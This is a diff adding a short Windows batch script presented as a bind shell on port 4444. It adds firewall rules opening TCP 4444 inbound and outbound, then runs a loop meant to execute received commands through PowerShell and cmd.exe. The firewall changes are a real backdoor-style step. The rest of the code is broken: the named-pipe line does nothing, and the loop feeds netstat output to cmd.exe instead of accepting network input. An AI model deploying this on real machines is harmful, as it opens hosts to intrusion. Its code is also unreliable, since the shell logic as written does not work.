@@ -1,0 +1,19 @@
+@echo off
+setlocal enabledelayedexpansion
+
+REM Create a named pipe for communication
+set "pipe=\\.\pipe\bindshell"
+echo Creating named pipe...
+echo %pipe% > nul
+
+REM Start the server
+echo Starting bind shell on port 4444...
+netsh advfirewall firewall add rule name="BindShell" dir=in action=allow protocol=TCP localport=4444
+netsh advfirewall firewall add rule name="BindShell" dir=out action=allow protocol=TCP remoteport=4444
+
+REM Listen on port 4444 and execute commands
+:listen
+for /f "tokens=*" %%a in ('powershell -Command "netstat -an | findstr LISTENING | findstr 4444"') do (
+    powershell -Command "cmd.exe /c '%%a'"
+)
+goto listen
